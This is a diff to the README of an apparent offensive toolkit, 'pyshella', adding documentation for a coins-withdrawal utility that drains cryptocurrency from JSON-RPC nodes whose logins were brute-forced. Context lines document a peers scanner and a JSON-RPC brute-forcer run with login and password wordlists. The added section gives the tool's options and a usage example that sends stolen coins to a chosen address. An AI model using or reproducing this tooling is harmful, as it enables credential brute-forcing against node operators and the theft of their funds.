@@ -14,6 +14,7 @@ cli scripts such as `peers-scanner`, `jsonrpc-searcher`,
 * [Peers Scanner](#peers-scanner)
 * [JSON-RPC Searcher](#json-rpc-searcher)
 * [JSON-RPC Bruter](#json-rpc-bruter)
+* [Coins Withdrawal](#coins-withdrawal)
 
 
 
@@ -118,4 +119,28 @@ optional arguments:
 Usage example:
 -> pyshella-jsonrpc-bruter --help
 -> pyshella-jsonrpc-bruter -n Bitcoin -t 20 -l <logins_file> -p <pwds_file> -b HLP
+```
+
+
+## Coins Withdrawal
+Utility which withdrawal crypto currency from bruted JSON-RPC.
+
+### How to use
+```
+usage: pyshella-coins-withdrawal [-h] -n NAME -mU URI -a ADDR [-i SECS]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -n NAME, --coin-name NAME
+                        Name of cryptocurrency.
+  -mU URI, --mongo-uri URI
+                        MongoDB uri.
+  -a ADDR, --withdrawal-address ADDR
+                        The address to which the coins will be sent.
+  -i SECS, --interval SECS
+                        Timeout after coins withdrawal from all the peers that
+                        were collected in the database at the moment.
+
+-----------------------------------------------------------------------------------------------------------------------
+Usage example: pyshella-coins-withdrawal -n Bitcoin -mU mongodb://root:toor@localhost:27017 -a <withdrawal_addr> -i 300
 ```
